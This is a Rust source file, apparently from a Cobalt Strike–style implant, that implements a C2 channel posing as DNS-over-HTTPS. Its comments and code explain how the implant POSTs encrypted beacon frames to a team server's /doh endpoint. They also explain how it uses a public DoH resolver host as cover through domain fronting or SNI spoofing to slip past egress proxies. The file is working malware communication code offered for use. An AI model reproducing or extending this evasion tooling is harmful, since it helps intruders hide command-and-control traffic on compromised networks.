//! DoH (DNS-over-HTTPS) channel.
//!
//! Implant POSTs the encrypted frame to the C2 server's `/doh` endpoint over
//! HTTPS. The body is the raw frame — the same payload the HTTPS channel sends
//! to `/beacon` — but the URI and framing masquerade as DoH traffic.
//!
//! ## Design rationale (CS 4.11 alignment)
//!
//! A *true* DoH tunnel (frame bytes encoded into DNS A/TXT queries against a
//! public resolver like cloudflare-dns.com) can't carry a 256 KiB beacon frame
//! in a single DNS query and would need a chunked-reassembly server. CS 4.11's
//! DoH Beacon sidesteps this: it HTTPS-POSTs directly to the team server's
//! `/dns-query`-style endpoint, blending with legitimate DoH egress by URI and
//! Content-Type while keeping the full-frame-over-HTTPS simplicity. This channel
//! mirrors that — `/doh` on the team server runs the same `handle_beacon` logic
//! as `/beacon`, so the crypto/anti-replay/tasking path is identical.
//!
//! `ctx.doh_resolver` is accepted but used only to select the *cover host*: when
//! set, the implant connects to that resolver host (e.g. `cloudflare-dns.com`)
//! on 443/TLS — useful when an egress proxy allowlists DoH resolver hosts but
//! the operator can still terminate TLS at the team server via domain
//! fronting/SNI spoofing. When empty, it POSTs directly to `server_host`, same
//! as the HTTPS channel. In both cases the path is `/doh` and the team server
//! is the real responder.
//!
//! ## Why not a custom Content-Type header?
//!
//! `transport::post_frame` only injects static request headers declared by the
//! active Malleable C2 profile (the `client { header ... }` block). Adding an
//! ad-hoc `Content-Type: application/dns-message` here would require a parallel
//! WinHTTP path. The URI `/doh` is the load-bearing blend signal; operators who
//! need the header add it via the profile.

#![cfg(target_os = "windows")]

use super::ChannelCtx;
use crate::heap::Vec;

/// Send `frame` as an HTTPS POST to `/doh` and return the server's response
/// frame, or `None` on transport failure.
///
/// This is a thin adapter over `transport::post_frame` (the same WinHTTP path
/// the HTTPS channel uses). The only differences from [`super::https::send_recv`]
/// are the URI (`/doh` vs `/beacon`) and the optional cover-host selection from
/// `ctx.doh_resolver`.
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    // Cover host: when a DoH resolver is configured, POST to it (TLS, 443) so
    // the connection's destination SNI/IP looks like a legitimate DoH client.
    // The team server must still terminate the TLS connection (domain fronting
    // or a redirector that answers for that host). When no resolver is set,
    // fall back to the configured server_host — behaviour identical to HTTPS.
    let host: &[u8] = if ctx.doh_resolver.is_empty() {
        ctx.server_host.as_bytes()
    } else {
        ctx.doh_resolver.as_bytes()
    };
    // Port: resolver cover uses 443/TLS; otherwise the configured server port.
    let port: u16 = if ctx.doh_resolver.is_empty() {
        ctx.server_port
    } else {
        443
    };
    // TLS is mandatory for the DoH blend (real DoH is always HTTPS). Force it
    // on regardless of ctx.use_tls when going through a resolver cover.
    let use_tls = ctx.use_tls || !ctx.doh_resolver.is_empty();
    unsafe {
        crate::transport::post_frame(
            host,
            port,
            // `/doh` is registered on the team server's beacon router (see
            // server::router) and runs the same handle_beacon logic as `/beacon`.
            b"/doh",
            frame,
            use_tls,
        )
    }
}
